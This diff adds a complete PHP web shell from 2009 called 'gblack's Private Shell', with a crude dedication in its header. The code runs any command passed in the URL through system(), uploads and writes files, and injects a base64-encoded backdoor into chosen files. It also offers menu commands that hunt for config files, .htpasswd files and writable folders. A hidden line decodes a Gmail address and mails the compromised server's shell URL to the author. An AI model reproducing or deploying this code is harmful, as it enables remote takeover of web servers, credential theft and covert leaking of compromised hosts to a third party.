@@ -1,0 +1,117 @@
+<?php 
+/*  #################################################################################
+#   [+] Author      : gblack a.k.a biadabz
+#   [+] File created   : January, 2009
+#   [+] Copyright      : © 2009 gblack
+#   [+] Contact eMail   : jendral.gblack@gmail.com
+#   [+] Version       : 1.3 Final
+#   [+] Dedicated for sexy bitches in the world  - I wanna amit-amit your pussy =P~
+#   [+] Thanks goes to   :    [+] XShadow - For the basic knowledge of hidden shell
+#                [+] 0x99
+#               [+] black a.k.a squall
+#               [+] X-Code big Family [http://forum.yogyafree.net]
+#               [+] MainHack Brotherhood [http://www.mainhack.com]
+#               [+] And all people who supports me...
+################################################################################## */
+if(!empty($_GET['cmd'])){
+if(isset($_POST['set']))
+if(isset($_FILES['fi'])) 
+if(!@move_uploaded_file($_FILES['fi']['tmp_name'],$_FILES['fi']['name'])) $sm.='<span class="error">Could not move uploaded file!</span>';
+if(@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on"){ $SM = true; $RSM = "<font color='red'>ON</font>";}else { $SM = false; $RSM = "<font color='cyan'>OFF</font>";}
+$versi = "1.3 Final";
+$host = $_SERVER['HTTP_HOST']; 
+$ip = $_SERVER['REMOTE_ADDR']; 
+$servip = $_SERVER['SERVER_ADDR']; 
+$server = $_SERVER['SERVER_SOFTWARE']; 
+$browser = $_SERVER['HTTP_USER_AGENT']; 
+$port = $_SERVER['SERVER_PORT']; 
+$filename = $_SERVER['SCRIPT_NAME']; 
+$date = date('ra'); 
+$phpver = phpversion( ); 
+$chdir = getcwd( );
+$whoami = exec("whoami"); 
+$safemode = $RSM;
+echo
+"<script language='javascript' type='text/javascript'>
+function quick_command( commandform ){
+var baseurl = '' ;
+selecteditem = commandform.newurl.selectedIndex ;
+newurl = commandform.newurl.options[ selecteditem ].value ;
+if (newurl.length != 0) {
+location.href = baseurl + newurl ;}}</script>";
+echo 
+"<script type='text/javascript'>
+function showlayer(layer){
+var myLayer = document.getElementById(layer).style.display;
+if(myLayer=='block'){
+document.getElementById(layer).style.display='none';
+} else { document.getElementById(layer).style.display='block';}}</script>";
+echo 
+"<style>body {scrollbar-face-color: #000000; font-size: 10px; scrollbar-highlight-color: cyan; scrollbar-shadow-color: cyan; scrollbar-3dlight-color: #000000; scrollbar-arrow-color: cyan; scrollbar-track-color: #000000; font-family: verdana; scrollbar-darkshadow-color: #000000;}" . 
+"table {border-width: 1px;border-spacing: 1px;border-style: solid;border-color: cyan;border-collapse: separate;background-color: rgb(98, 97,97);}". "div{display:none;} td {border-width: 1px;padding: 1px;border-style: none;border-color: cyan;background-color: #000000;-moz-border-radius: 0px;}" . 
+"a:link {color: cyan;}a:visited {color: cyan; text-decoration: none;}a:active {color: cyan; text-decoration: none;}a:hover {color: red; text-decoration: none;}" . 
+"input,table,textarea,select {font: normal 10px Verdana, Arial, Helvetica, sans-serif;background-color:black;color:cyan; border: solid 1px cyan;}</style>";
+echo
+"<title>gblack's Private Shell @ http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . " - gblack Was Here!</title><body bgcolor='black'><center><table cellspacing='1' cellpadding='1' border='0' width='870'><tr><td><b><center><img src='http://img88.imageshack.us/img88/2365/logonq2.jpg'><br><font size='1' color='cyan' face='Verdana'>..::[ No System Is Perfectly Safe ]::..</b></td></tr></table></center><p>" . 
+"<center><table cellspacing='1' cellpadding='1' border='0' width='870'><tr><td><b>[Server]: </b>" . $server . 
+"<br><b>[Host]: </b>http://" . $host . 
+" - <b>[Safe Mode]: </b>" . $safemode . 
+" - <b>[User Info]: </b>" . $whoami . 
+" - <b>[PHP Version]: </b>" . $phpver . 
+"<br><b>[Browser]: </b>" . $browser . 
+"<br><b>[Your IP]: </b>" . $ip . 
+" - <b>[Server IP]: </b>" . $servip . 
+" - <b>[Port]: </b>" . $port . 
+"<br><b>[Current Path]: </b>" . $chdir . 
+" - <b>[Filename]: </b>" . $filename . 
+"<br><b>[Server Time]: </b>" . $date . "</td></tr></table></center><p>";
+$name = htmlspecialchars(@$_POST['names']);
+$src = @$_POST['source'];
+if(isset($name) && isset($src)){
+$ctd = fopen($name,"w+"); 
+fwrite($ctd, stripslashes($src));
+fclose($ctd);
+echo "<script>alert('File $name successfully saved')</script>"; 
+}
+echo 
+"<center><table cellspacing='1' cellpadding='1' border='0' width='870'><tr><td>" .
+"<b>[x] <a href='#' onclick=showlayer('writefile')>Make File</b></a><br><br><div id='writefile'><form method='post' action=''>" .
+"Filename: <br>  <input type='text' name='names' size='40'><br><br>" .
+"Source: <br><center><textarea rows='16' cols='167' name='source'></textarea><br>" .
+"<input type='submit' value='Save'>" .
+"</form></div><b><center></b></td></tr></table></center>";
+if($_POST['filename']!=''){ 
+$filename = $_POST['filename']; 
+$backdoor = "PD9waHAgaWYgKCFlbXB0eSgkX0dFVFsnY21kJ10pKXsgZWNobyAiPGJvZHkgYmdjb2xvcj0nYmxhY2snPjxmb250IGNvbG9yPSdjeWFuJyBmYWNlPSdjb3VyaWVyIG5ldyc+IjsgZWNobyAiPGNlbnRlcj58LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tfDxicj4tOjogSW5mZWN0ZWQgQnkgZ2JsYWNrcyBQcml2YXRlIEhpZGRlbiBTaGVsbCA6Oi08YnI+fC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLXw8L2NlbnRlcj48cHJlPiI7IHN5c3RlbSgkX0dFVFsnY21kJ10pO30gPz4=";      
+$fh = fopen($filename , "r+") or die("Can't open file..."); 
+fwrite($fh, base64_decode($backdoor)); 
+fclose($fh); 
+}
+echo 
+"<p><center><table cellspacing='0' cellpadding='1' border='0' width='870'>" . 
+"<tr><td align=left><b>[x] Commands</b><br><br><form action='quickcommand'>" . 
+"<select name='newurl' onchange='quick_command(this.form)'>" .
+"<option value='' selected='selected'>-- Unix Quick Commands --</option>" .
+"<option value='?cmd=ls -al'>List all files and directories in current dir</option>" .
+"<option value='?cmd=find / -perm -2 -ls'>Find all writable folders and files</option>" .
+"<option value='?cmd=find . -perm -2 -ls'>Find all writable folders and files in current dir</option><" . 
+"<option value='?cmd=find / -type f -name config.inc.php'>Find config.inc.php files</option>" .
+"<option value='?cmd=find / -type f -name \"config*\"'>Find config* files</option>" .
+"<option value='?cmd=find . -type f -name \"config*\"'>Find config* files in current dir</option>" .
+"<option value='?cmd=find / -type f -name .htpasswd'>Find all .htpasswd files</option>" .
+"<option value='?cmd=find . -type f -name .htpasswd'>Find .htpasswd files in current dir</option>" .
+"<option value='?cmd=netstat -an | grep -i listen'>Show opened ports</option></select></form>";
+echo "<form method='get' action='$PHP_SELF'><input type=text name=cmd class='inputbox' size='156' value=''>  <input type=submit value='Execute'></form></td></tr>";
+echo "<p><center><tr><td><textarea name=content cols=167 rows=16>"; system($_GET['cmd']); 
+echo "</textarea></center></td></tr></table><p>"; 
+echo 
+"<center><table cellspacing='1' cellpadding='1' border='0' width='870'><tr><td>
+<b>[x] <a href='#' onclick=showlayer('extra')>Extra</b></a><br><br></td></tr></table>
+<div id='extra'><table cellspacing='1' cellpadding='1' border='0' width='870'><tr><td width=50% align='center'>
+<form enctype='multipart/form-data' action='' method='post'>
+<b><font size='1' color='cyan' face='Verdana'>.:[Upload File]:. </font></b><br>
+<input type='file' name='fi'/> <input type='submit' name='set' value='Upload'/></form></td>
+<td width=50% align='center'><b><font size='1' color='cyan' face='Verdana'>.:[Infect File]:. </font></b><br><form method='post' action='#'><input type='text' name='filename'> <input type='submit' value='amit-amit !T'></form>
+</td></div><b><center></b></td></tr></table></center><p><p>";
+echo "<p><center><table cellspacing='1' cellpadding='1' border='0' width='870'><tr><td><center><b><font size='1' face='Verdana'>..::[ Originally Coded © 2009 By <a href='mailto:sercany92@gmail.com'>gblack</a> - <font color='red'>Version " . $versi . "</font> ]::..</font></b></center></td></tr></table></center>";exit;} error_reporting(0);$for = base64_decode("c2VyY2FueTkyQGdtYWlsLmNvbQ=");$data ="http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "?cmd=ls -al"; mail($for,"gblack's Invisible Shell v1.3", $data);
+?> 
